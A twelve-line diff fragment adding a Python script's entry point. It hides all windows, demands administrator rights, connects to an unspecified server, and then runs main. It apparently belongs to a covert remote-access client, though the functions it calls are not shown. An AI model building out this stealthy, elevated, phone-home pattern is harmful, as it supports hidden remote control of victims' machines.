@@ -1,0 +1,12 @@
+
+
+if __name__ == '__main__':
+
+    hide_all_windows(1)
+
+    is_admin = run_as_admin()
+    if not is_admin: exit()
+    admin_access='Yes' if is_admin else 'No'
+
+    connect_to_server()
+    sys.exit(main())
